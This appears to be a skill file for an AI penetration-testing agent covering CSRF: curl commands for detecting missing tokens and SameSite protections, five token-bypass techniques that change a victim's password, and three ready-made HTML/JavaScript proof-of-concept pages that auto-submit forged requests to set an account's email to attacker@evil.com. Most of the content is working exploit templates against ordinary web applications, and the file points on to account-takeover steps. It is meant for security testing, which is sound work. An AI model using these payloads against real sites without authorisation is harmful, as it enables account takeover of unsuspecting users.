---
name: vuln-csrf
description: "CSRF (Cross-Site Request Forgery) testing — token bypass, SameSite bypass, Referer-only validation bypass, JSON CSRF, multipart CSRF, cross-origin state change. Triggers: 'csrf', 'cross site request forgery', 'csrf bypass', 'csrf token bypass', 'samesite bypass', 'csrf exploit', 'forged request', 'anti-csrf', 'state-changing request'."
---

# CSRF Testing

Force authenticated users to execute unintended state-changing actions.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
SESSION="Cookie: session=TOKEN"

# Map all state-changing endpoints (POST/PUT/PATCH/DELETE):
curl -s -H "$SESSION" "$TARGET/api/v1/" | jq 'keys'

# Check if state-changing requests use CSRF tokens:
curl -s -H "$SESSION" -X POST "$TARGET/api/v1/settings/email" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' | head -50

# Check SameSite cookie attribute:
curl -s -H "$SESSION" "$TARGET/api/v1/profile" -I | grep -i "set-cookie"
# SameSite=None;Secure → CSRF possible
# SameSite=Lax → CSRF limited to top-level navigation
# SameSite=Strict → CSRF blocked

# Check Referer/Origin validation:
curl -s -H "$SESSION" -H "Referer: https://evil.com" -X POST "$TARGET/api/v1/settings/email" \
  -H "Content-Type: application/json" -d '{"email":"test@test.com"}' -I

# No CSRF token required + no SameSite → vulnerable
```

---

## Phase 2: CSRF Bypass Techniques

```bash
TARGET="https://TARGET"

# Technique 1: Remove CSRF token parameter entirely:
curl -s -H "Cookie: session=VICTIM_TOKEN" -X POST "$TARGET/api/v1/settings" \
  -H "Content-Type: application/json" \
  -d '{"password":"newpassword123"}'

# Technique 2: Empty CSRF token value:
curl -s -H "Cookie: session=VICTIM_TOKEN" -X POST "$TARGET/api/v1/settings" \
  -H "Content-Type: application/json" \
  -d '{"password":"newpassword123","_csrf":""}'

# Technique 3: Use another user's valid CSRF token:
ATTACKER_CSRF="TOKEN_FROM_ATTACKER_ACCOUNT"
curl -s -H "Cookie: session=VICTIM_TOKEN" -X POST "$TARGET/api/v1/settings" \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"newpassword123\",\"_csrf\":\"$ATTACKER_CSRF\"}"

# Technique 4: Method override (POST to GET):
curl -s -H "Cookie: session=VICTIM_TOKEN" "$TARGET/api/v1/settings?_method=POST&password=newpassword"

# Technique 5: Content-Type bypass (change to text/plain — removes preflight):
curl -s -H "Cookie: session=VICTIM_TOKEN" -X POST "$TARGET/api/v1/settings" \
  -H "Content-Type: text/plain" \
  -d 'password=newpassword123'
```

---

## Phase 3: PoC Generation

```bash
TARGET="https://TARGET"
ENDPOINT="/api/v1/settings/email"

# Simple form-based CSRF PoC:
cat > output/csrf_poc.html << 'EOF'
<html>
<body onload="document.forms[0].submit()">
<form method="POST" action="https://TARGET/api/v1/settings/email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <!-- Remove CSRF token or use attacker's own -->
</form>
</body>
</html>
EOF

# JSON CSRF (requires no CORS restriction on POST with text/plain):
cat > output/csrf_json_poc.html << 'EOF'
<html>
<body>
<form method="POST" action="https://TARGET/api/v1/settings/email" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
EOF

# Fetch-based CSRF for SameSite=None with ACAO:
cat > output/csrf_fetch_poc.html << 'EOF'
<html>
<body>
<script>
fetch("https://TARGET/api/v1/settings/email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
</body>
</html>
EOF
```

---

## Output

Save to `output/`:
- `csrf_poc.html` — form-based PoC
- `csrf_json_poc.html` — JSON CSRF PoC
- `csrf_fetch_poc.html` — fetch-based PoC

## Next Phase

→ `vuln-csrf-advanced` for SameSite bypass chaining
→ `vuln-account-takeover` to demonstrate ATO impact
→ `pentest-report` to document findings
